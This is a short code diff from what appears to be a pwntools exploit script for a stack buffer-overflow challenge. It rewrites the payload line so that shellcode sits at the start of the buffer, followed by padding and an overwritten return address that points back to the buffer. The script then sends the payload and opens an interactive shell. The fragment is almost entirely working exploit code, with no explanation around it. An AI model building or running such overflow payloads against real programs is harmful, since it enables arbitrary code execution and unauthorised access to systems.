@@ -26,7 +26,8 @@ lib_c = int(io.recvline(keepends=False),16)
 padding = bp - buf + 8 
 ret_addr = bp + 8
 
-s =  b'a'*padding + struct.pack("<Q",ret_addr) + shellcode 
+# s =  b'a'*padding + struct.pack("<Q",buf) + shellcode 
+s =  shellcode + b'a'* (padding - len(shellcode))+ struct.pack("<Q",buf)  
 
 io.sendline(s)
 io.interactive()
